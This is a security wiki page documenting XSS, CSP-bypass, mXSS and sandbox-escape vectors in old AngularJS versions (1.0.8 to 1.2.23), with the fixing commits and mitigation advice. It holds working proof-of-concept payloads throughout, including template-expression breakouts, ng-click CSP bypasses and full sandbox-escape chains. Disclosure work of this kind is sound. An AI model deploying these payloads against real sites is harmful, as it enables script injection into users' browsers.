

# Introduction #

"AngularJS is an open-source JavaScript framework, maintained by Google, that assists with running single-page applications. Its goal is to augment browser-based applications with model–view–controller (MVC) capability, in an effort to make both development and testing easier.

The library reads in HTML that contains additional custom tag attributes; it then obeys the directives in those custom attributes, and binds input or output parts of the page to a model represented by standard JavaScript variables. The values of those JavaScript variables can be manually set, or retrieved from static or dynamic JSON resources."

From http://en.wikipedia.org/wiki/AngularJS

# Quick Facts #

  * [AngularJS 1.1.5 (Uncompressed)](http://ajax.googleapis.com/ajax/libs/angularjs/1.1.5/angular.js)
  * Supports CSP
  * Maintained by Google
  * Security contact available via security@angularjs.org
  * Usage Stats http://trends.builtwith.com/javascript/Angular-JS

## AngularJS 1.0.8 ##

  * **{}SEC-A** <font color='orange'><b>FAIL</b></font> Template expressions are equivalent to `eval` (fixed in RC versions)
  * **{}SEC-B** <font color='red'><b>FAIL</b></font> Isolated execution scope exists, yet fails as sandbox
  * **{}SEC-C** <font color='red'><b>FAIL</b></font> Anything can execute JavaScript. Attributes, curlies, encoded curlies, you name it!
  * **{}SEC-D** <font color='red'><b>FAIL</b></font> No enforced separation, possible though and documented. Close fail on a tough requirement.
  * **{}SEC-E** <font color='green'><b>PASS</b></font> A security@angularjs.org address is in place
  * **{}SEC-F** <font color='orange'><b>FAIL</b></font> A special CSP-mode can be activated. While this is great, it re-enables injection attacks against Angular-driven websites

## AngularJS 1.2.0 ##

  * **{}SEC-A** <font color='orange'><b>FAIL</b></font> Some template directives still allow for arbitrary JavaScript execution
  * **{}SEC-B** <font color='green'><b>PASS</b></font> Isolated execution scope exists, makes a robust impression.
  * **{}SEC-C** <font color='orange'><b>FAIL</b></font> Any element with the ng-app attribute can execute expressions. Injections might cause damage. Examples can be seen below.
  * **{}SEC-D** <font color='red'><b>FAIL</b></font> No enforced separation, possible though and documented. Close fail on a tough requirement.
  * **{}SEC-E** <font color='green'><b>PASS</b></font> A security@angularjs.org address is in place
  * **{}SEC-F** <font color='green'><b>PASS</b></font> A special CSP-mode can be activated. The CSP-bypass was mitigated by fixing the expression parser.

# Injection Attacks #

AngularJS offers frontend developers a scope object that attempts to isolate global variables from the templating work-flow and keep things lean and "Angular-only". This makes sense - and to be fair, the AngularJS documentation explicitly states that the scope object is not considered to be a sandbox. And indeed it is none. With a simple JavaScript trick one can break out of this "non-sandbox" and execute arbitrary code in window and other host objects.

## AngularJS 1.0.8 and 1.1.5 ##

### XSS in Template ###

As can be seen in the "paste-and-go"-ready code examples: once an attacker controls the content of the `ng-app` block, almost arbitrary script execution is possible. Everything inside `{{` and `}}` is treated as AngularJS expression and with the mentioned trick we can break out our scope and get access to `window`.

```
<script src="http://ajax.googleapis.com/ajax/libs/angularjs/1.1.5/angular.min.js"></script>
<div class="ng-app">
{{constructor.constructor('alert(1)')()}}
</div>
```

### HTML-encoded XSS in Template ###

AngularJS has no mercy for developers who like to secure their applications by properly encoding user generated data. As the following example shows, even HTML-encoded curlies allow payload execution.

```
<script src="http://ajax.googleapis.com/ajax/libs/angularjs/1.1.5/angular.min.js"></script>
<div class="ng-app">
&#x7b;&#x7b;constructor.constructor('alert(1)')()&#x7d;&#x7d;
</div>
```

And just to be on the safe side, AngularJS executes the alert twice.

### XSS via class-attribute ###

```
<script src="http://ajax.googleapis.com/ajax/libs/angularjs/1.1.5/angular.min.js"></script>
<div class="ng-app">
    <b class="ng-style: {x:constructor.constructor('alert(1)')()};" />
</div>
```

### XSS via data attributes ###

```
<script src="http://ajax.googleapis.com/ajax/libs/angularjs/1.1.5/angular.min.js"></script>
<b data-ng-app data-ng-style="constructor.constructor('alert(1)')()" />
```

## CSP Bypasses with AngularJS 1.0.8 and 1.1.5 ##

AngularJS is one of the very few - if not the only - MVC frameworks that has an explicit CSP mode. That means, developers can use the powerful templating engine despite the restrictions on eval and Function CSP imposes.

That nevertheless bears risks and leads to an interesting phenomenon: In case an attacker can inject HTML into an AngularJS application context, the injected JavaScript will be executed although CSP should protect from this. in other words: AngularJS brings inline-JavaScript on CSP-protected websites back - by using its own attributes and a complex string parsing and event binding mechanism we will discuss later on this page.

### XSS via Click & Hover (ng-click & ng-mouseover attribute) ###

```
<?php
header('X-Content-Security-Policy: default-src \'self\' ajax.googleapis.com');
header('Content-Security-Policy: default-src \'self\' ajax.googleapis.com');
header('X-Webkit-CSP: default-src \'self\' ajax.googleapis.com');
header('Set-Cookie: abc=123');
?><!doctype html>
<html ng-app ng-csp>
<head>
<script src="http://ajax.googleapis.com/ajax/libs/angularjs/1.1.5/angular.min.js"></script>
</head>
<body ng-click="$event.view.alert(1)">
	Click me
	<h1 ng-mouseover="$event.target.ownerDocument.defaultView.alert(2)">Hover me</h1>
</body>
```

### XSS via Click (data-ng-click attribute) ###

```
<?php
header('X-Content-Security-Policy: default-src \'self\' ajax.googleapis.com');
header('Content-Security-Policy: default-src \'self\' ajax.googleapis.com');
header('X-Webkit-CSP: default-src \'self\' ajax.googleapis.com');
header('Set-Cookie: abc=123');
?><!doctype html>
<html ng-app ng-csp>
<head>
<script src="http://ajax.googleapis.com/ajax/libs/angularjs/1.1.5/angular.min.js"></script>
</head>
<body data-ng-click="$event.view.alert(1)" onclick="alert(2)">Click me</body>
```

### XSS via Template Cache ###

```
<?php
header('X-Content-Security-Policy: default-src \'self\' ajax.googleapis.com');
header('Content-Security-Policy: default-src \'self\' ajax.googleapis.com');
header('X-Webkit-CSP: default-src \'self\' ajax.googleapis.com');
header('Set-Cookie: abc=123');
?><!doctype html>
<html ng-csp ng-app="foo">
<head>
<script
src="http://ajax.googleapis.com/ajax/libs/angularjs/1.1.5/angular.min.js"></script>
<script src="test.js"></script>
</head>
<body>
<div>
  <ng-include src="'one.html'"></ng-include>
</div>
</body>
</html>
```

test.js
```
var foo = angular.module("foo", []);
foo.run(['$templateCache', function($templateCache) {
    $templateCache.put('one.html', '<h1 data-ng-click="$event.view.alert(1)">Click me</h1>');
}]);
```

### XSS on Hover with CSS-based Overlay ###

```
var foo = angular.module("foo", []);
foo.run(['$templateCache', function($templateCache) {
    $templateCache.put('one.html', '<h1 data-ng-style="{border: \'1000px solid red\'}" data-ng-mouseover="$event.view.alert(1)">Click me</h1>');
}]);
```

### XSS via JSON Callback ###

```
<?php
header('X-Content-Security-Policy: default-src \'self\' ajax.googleapis.com');
header('Content-Security-Policy: default-src \'self\' ajax.googleapis.com');
header('X-Webkit-CSP: default-src \'self\' ajax.googleapis.com');
header('Set-Cookie: abc=123');
?><!doctype html>
<html ng-app ng-csp>
<head>
<script src="http://ajax.googleapis.com/ajax/libs/angularjs/1.1.5/angular.min.js"></script>
<script src="test.js"></script>
</head>
<body>
<div ng-controller="FetchCtrl">
<input type="text" ng-model="url" size="80" />
<button ng-click="fetch()">fetch</button>
</div>
</body>
</html>
```

test.js
```
function FetchCtrl($scope, $http, $templateCache) {
    $scope.method = 'JSONP';
    $scope.fetch = function() {
    $scope.code = null;
    $scope.response = null;
    $http({method: $scope.method, url: $scope.url, cache: $templateCache}).
    	success(function(data, status) {
    		$scope.status = status;
    		$scope.data = data;
    	})
    };
    $scope.updateModel = function(method, url) {
    	$scope.method = method;
    	$scope.url = url;
 	};
}
function foo(){
	alert('JSON callback received')
}
```

test.json
```
<?php echo $_GET['callback']; ?>({"name":"Super Hero","salutation":"Namaskar","greeting":"Namaskar Super Hero!"});
```

## Eval via Function (no CSP) ##

Below we can see the code that causes the XSS (in non-CSP modes). Again the framework makes use of implicit `eval` using the `Function` constructor:

```
    function getterFn(path, csp) {
        if (getterFnCache.hasOwnProperty(path)) {
            return getterFnCache[path];
        }
        
        var pathKeys = path.split('.'), 
        pathKeysLength = pathKeys.length, 
        fn;
        
        if (csp) {
            fn = (pathKeysLength < 6) 
            ? cspSafeGetterFn(pathKeys[0], pathKeys[1], pathKeys[2], pathKeys[3], pathKeys[4]) 
            : function(scope, locals) {
                var i = 0, val;
                do {
                    val = cspSafeGetterFn(
                    pathKeys[i++], pathKeys[i++], pathKeys[i++], pathKeys[i++], pathKeys[i++]
                    )(scope, locals);
                    
                    locals = undefined; // clear after first iteration
                    scope = val;
                } while (i < pathKeysLength);
                return val;
            }
        } else {
            var code = 'var l, fn, p;\n';
            forEach(pathKeys, function(key, index) {
                code += 'if(s === null || s === undefined) return s;\n' + 
                'l=s;\n' + 
                's=' + (index 
                // we simply dereference 's' on any .dot notation
                ? 's' 
                // but if we are first then we check locals first, and if so read it first
                : '((k&&k.hasOwnProperty("' + key + '"))?k:s)') + '["' + key + '"]' + ';\n' + 
                'if (s && s.then) {\n' + 
                ' if (!("$$v" in s)) {\n' + 
                ' p=s;\n' + 
                ' p.$$v = undefined;\n' + 
                ' p.then(function(v) {p.$$v=v;});\n' + 
                '}\n' + 
                ' s=s.$$v\n' + 
                '}\n';
            });
            code += 'return s;';
            fn = Function('s', 'k', code); // s=scope, k=locals
            fn.toString = function() {
                return code;
            };
        }
        
        return getterFnCache[path] = fn;
    }
```

## "Eval" via Event Binding (using CSP) ##

More interesting is the way how AngularJS enables inline JavaScript despite restrictive CSP headers being in place. On initialization of the page, AngularJS walks over all event-handling attributes and binds the matching event. Then, upon execution of the event, the content of the attribute is being parsed,tested for validity and ultimately executed. Using events, the parser and direct object access, AngularJS manages to perform a "string-to-code" without using any `eval` or `Function`. Templating despite CSP works - but injection work as well.

```
var ngEventDirectives = {};
forEach(
  'click dblclick mousedown mouseup mouseover mouseout mousemove mouseenter mouseleave keydown keyup keypress'.split(' '),
  function(name) {
    var directiveName = directiveNormalize('ng-' + name);
    ngEventDirectives[directiveName] = ['$parse', function($parse) {
      return function(scope, element, attr) {
        var fn = $parse(attr[directiveName]);
        element.bind(lowercase(name), function(event) {
          scope.$apply(function() {
            fn(scope, {$event:event});
          });
        });
      };
    }];
  }
);

[...]

function cspSafeGetterFn(key0, key1, key2, key3, key4) {
  return function(scope, locals) {
    var pathVal = (locals && locals.hasOwnProperty(key0)) ? locals : scope,
        promise;

    if (pathVal === null || pathVal === undefined) return pathVal;

    pathVal = pathVal[key0];
    if (pathVal && pathVal.then) {
      if (!("$$v" in pathVal)) {
        promise = pathVal;
        promise.$$v = undefined;
        promise.then(function(val) { promise.$$v = val; });
      }
      pathVal = pathVal.$$v;
    }
    if (!key1 || pathVal === null || pathVal === undefined) return pathVal;

    pathVal = pathVal[key1];
    if (pathVal && pathVal.then) {
      if (!("$$v" in pathVal)) {
        promise = pathVal;
        promise.$$v = undefined;
        promise.then(function(val) { promise.$$v = val; });
      }
      pathVal = pathVal.$$v;
    }
    if (!key2 || pathVal === null || pathVal === undefined) return pathVal;

    pathVal = pathVal[key2];
    if (pathVal && pathVal.then) {
      if (!("$$v" in pathVal)) {
        promise = pathVal;
        promise.$$v = undefined;
        promise.then(function(val) { promise.$$v = val; });
      }
      pathVal = pathVal.$$v;
    }
    if (!key3 || pathVal === null || pathVal === undefined) return pathVal;

    pathVal = pathVal[key3];
    if (pathVal && pathVal.then) {
      if (!("$$v" in pathVal)) {
        promise = pathVal;
        promise.$$v = undefined;
        promise.then(function(val) { promise.$$v = val; });
      }
      pathVal = pathVal.$$v;
    }
    if (!key4 || pathVal === null || pathVal === undefined) return pathVal;

    pathVal = pathVal[key4];
    if (pathVal && pathVal.then) {
      if (!("$$v" in pathVal)) {
        promise = pathVal;
        promise.$$v = undefined;
        promise.then(function(val) { promise.$$v = val; });
      }
      pathVal = pathVal.$$v;
    }
    return pathVal;
  };
}
```

# The State of AngularJS 1.2.x #

This (currently) most recent version of AngularJS has received an internal security audit and several of the aforementioned issues were fixed or mitigated. A large number of issues showcased here were addressed as well. Which is good and gave AngularJS a positive boost in the security matrix.

Well, several issues - but not all of them. We cannot get a reference to a potentially dangerous object from inside an expression any more - `Function`, `window` and others were black-listed and the property check in place looks pretty tough. So, say bye-bye to `{{constructor.constructor('alert(1)')()}}`.

The CSP bypasses were addressed as well. We can still access the `$event` object - yet cannot get a hold on `window` or the attached elements. Now, what is left then?

## Protection Bypasses ##

Interestingly, even the attribute-wrappers receive sanitation. Like it's the late nineties all over again:

```
  var hasDirectives = {},
      Suffix = 'Directive',
      COMMENT_DIRECTIVE_REGEXP = /^\s*directive\:\s*([\d\w\-_]+)\s+(.*)$/,
      CLASS_DIRECTIVE_REGEXP = /(([\d\w\-_]+)(?:\:([^;]+))?;?)/,
      aHrefSanitizationWhitelist = /^\s*(https?|ftp|mailto|file):/,
      imgSrcSanitizationWhitelist = /^\s*(https?|ftp|file):|data:image\//;

  // Ref: http://developers.whatwg.org/webappapis.html#event-handler-idl-attributes
  // The assumption is that future DOM event attribute names will begin with
  // 'on' and be composed of only English letters.
  var EVENT_HANDLER_ATTR_REGEXP = /^(on[a-z]*|formaction)$/;
```

This prohibits an attacker from using JavaScript and other critical URL schemes for certain attributes - yet leaves a bunch of important attributes complete out of consideration.

Here's what we **cannot** do any more (DOM errors will be thrown, URLs will be prefixed with the string `unsafe:`):

```
<html ng-app>
<head>
	<script src="https://ajax.googleapis.com/ajax/libs/angularjs/1.2.0-rc.2/angular.min.js"></script>
</head>
<body>
	<a ng-attr-href="{{'javascript:'}}alert(1)">CLICK</a>
	<iframe ng-attr-src="{{'javascript:alert(1)'}}"></iframe>
</body>
```

And here's what we still can do in AngularJS 1.2.0 - bypassing the overall not-so-well-composed blacklist:

```
<html ng-app>
<head>
	<script src="https://ajax.googleapis.com/ajax/libs/angularjs/1.2.0-rc.2/angular.min.js"></script>
</head>
<body>
	<form ng-attr-action="{{'javascript:'}}alert(1)"><button>CLICK</button></form>
	<iframe ng-attr-srcdoc="{{'<img src=x onerror=alert(1)>'}}"></iframe>
</body>
```

AngularJS 1.2.1 got these fixed in November 2013: [#4927](https://github.com/angular/angular.js/issues/4927), [#4933](https://github.com/angular/angular.js/pull/4933). It is not possible to concatenate values and the `srcdoc` attribute has been flagged as insecure and cannot be used any more.

## HTML Imports ##

AngularJS supports a directive that emulates the dreaded HTML imports. That means, we can request a piece of markup from the same domain (or across domains if the attacker has CORS enabled) and have the framework merge the resulting data into our DOM.

This enables another very interesting way to execute arbitrary JavaScript using `class` attributes - even with latest AngularJS.

```
<html ng-app>
<head>
	<meta charset="utf-8">
	<script src="https://ajax.googleapis.com/ajax/libs/angularjs/1.2.3/angular.min.js"></script>
</head>
<body>
	<span class="ng-include:'//ø.pw'"></span>
</body>
```

In no way should a `class` attribute ever be able to execute arbitrary JavaScript. This issue currently seems to be the most risky part of AngularJS' directives. It further enables yet another CSP bypass in combination with a GIF file:

Demo: http://html5sec.org/cspbypass/

Mitigation advice: AngularJS has a well working HTML sanitizer. Use it before attaching the fetched markup to the DOM.

## mXSS via HTML Import ##

AngularJS has the habit of using `document.createComment()` for several directives. It for example creates a comment as soon as an include has taken place and tells the DOM "hey, here's the comment telling everyone that I just included stuff". While there's certainly a great, super-heroic reason for that, there's also an interesting vulnerability hidden beneath.

This time it's an mXSS problem that can emerge, in case the attacker is able to minimally influence fragments of the include path via `location.hash` or alike:

```
<!doctype html>
<html ng-app>
<head>
<script src="https://ajax.googleapis.com/ajax/libs/angularjs/1.2.6/angular.min.js"></script>
</head>
<body>
<b class="ng-include:'somefile?--&gt;&lt;svg&sol;onload=alert&lpar;1&rpar;&gt;'">HELLO</b>
<button onclick="body.innerHTML+=1">do the mXSS thing</button>
</body>
```

Two things happen here: The include takes place (404 or not, doesn't matter) and AngularJS writes the comment into the DOM. Then, we have an `innerHTML`-access. This re-writes the markup and thereby activates the XSS hidden within the HTML comment. Note that we use HTML entities to mask our payload - yet it still works.

Mitigation advice: Don't write unsanitized comments into the DOM. Note the `-->` will not be encoded if used with `document.createComment()` and actually terminate the comment in the DOM.

# Sandbox Bypasses #

## AngularJS < 1.2.19 / < 1.3.0-beta.14 ##

The following lines describe two AngularJS sandbox bypasses discovered by Jann Horn - who also contributed this section to the wiki:

In AngularJS before 1.2.19 / 1.3.0-beta.14:

  * you can obtain a reference to `Object` with `({})["constructor"]` (because although the name `constructor` is blacklisted, only the `Function` object was considered dangerous)
    * all the interesting methods of `Object` are accessible
    * fixed now
  * you can obtain a reference to `Function.prototype` with `''.sub.__proto__`
    * fixed now, `__proto__` is blacklisted as member name (also for subscript notation)
  * the result of the subscript operator is checked, but the result of the dot operator isn't (for performance reasons, I think)
    * the dot operator checks that the member name isn't `constructor` though
    * still the same
  * on function calls, the `this` argument, the callee and (after execution) the result are checked, but the arguments aren't
    * still the same
  * there are no restrictions on the usage of `call` (and `apply` and `bind`)
    * fixed now (but you can still get reduced variants of `call`/`apply` using methods from the `Array` prototype)
  * you can use `__defineGetter__` and friends
    * fixed now, they're blacklisted as member names and invoking them is forbidden

This means that you can construct a bypass using these parts:
  * bypass member name check and subscript/call result check using `({})["constructor"].getOwnPropertyDescriptor(''.sub.__proto__, "constructor").value`
    * gives you `Function.prototype.constructor`, which is `Function`
  * bypass function call checks: invoke `thisarg.func(args...)` using `''.sub.call.call(function, thisarg, args...)`
    * now you can also call `Function`!

And this is the complete bypass code:

```
    ''.sub.call.call(
          ({})["constructor"].getOwnPropertyDescriptor(''.sub.__proto__, "constructor").value,
          null,
          "alert(1)"
    )()
```

Also, you can use `{}.__defineGetter__.call(null, 'alert', (0).valueOf.bind(0))` to invoke `__defineGetter__` on `null`, which
causes it to operate on the `window` object instead. Overwriting `window.alert` with a getter that returns zero makes `obj.alert`
falsy, meaning that AngularJS won't recognize (and block) attempts to access it anymore.

These are the commits that fix the issues: https://github.com/angular/angular.js/compare/2df721...2e6144

This is the corresponding Changelog entry: https://github.com/angular/angular.js/commit/b3b501

Shortened, stand-alone example:

```
<html ng-app>
<head>
    <meta charset="utf-8">
    <script src="https://ajax.googleapis.com/ajax/libs/angularjs/1.2.18/angular.js"></script>
</head>
<body>
{{(_=''.sub).call.call({}[$='constructor'].getOwnPropertyDescriptor(_.__proto__,$).value,0,'alert(1)')()}}
</body>
```

## AngularJS 1.2.19-1.2.23 / > 1.3.0-beta.14 ##
The following lines describe an AngularJS sandbox bypass discovered by Mathias Karlsson - who also contributed this section to the wiki:

  * you can obtain a reference to Function by simply using `toString.constructor` (this was previously fixed but re-broken in 1.2.19)
    * fixed now
  * you can obtain a reference to Function.prototype by simply using `toString.constructor.prototype` (this was previously fixed but re-broken in 1.2.19)
    * can be used to override native methods on Function.prototype such as toString and valueOf
    * fixed now
  * Array functions that executes callbacks, such as Array.filter, Array.sort and Array.map are allowed
    * calling blacklisted functions such as Function() through these works!
  * Array functions with callbacks executes the callback function using objects in the array as arguments.
    * Using this, we can control the arguments of Function and create a new function
  * When JavaScript compares the return values of the callback functions
    * If the return value is an unexpected type, it will be converted to a string for comparison using the toString method.
    * Overriding toString with call will make JS call the function instead of converting it to a string

Using these observations we can construct a bypass like this:
```
toString.constructor.prototype.toString=toString.constructor.prototype.call;
["a","alert(1)"].sort(toString.constructor);
```

Since browsers handles the order of the items to be sorted differently when sending them to the provided comparison (callback) function, a bypass for other browsers can easily be constructed by swapping the order of the items:
```
toString.constructor.prototype.toString=toString.constructor.prototype.call;
["alert(1)","a"].sort(toString.constructor);
```

This commit fix the issue: https://github.com/angular/angular.js/commit/b39e1d47b9a1b39a9fe34c847a81f589fba522f8

Stand-alone example:
```
<html ng-app>
    <head>
        <meta charset="utf-8">
        <script src="http://ajax.googleapis.com/ajax/libs/angularjs/1.2.23/angular.js"></script>
    </head>
    <body>
    {{toString.constructor.prototype.toString=toString.constructor.prototype.call;
    ["a","alert(1)"].sort(toString.constructor)}}
    </body>
</html>
```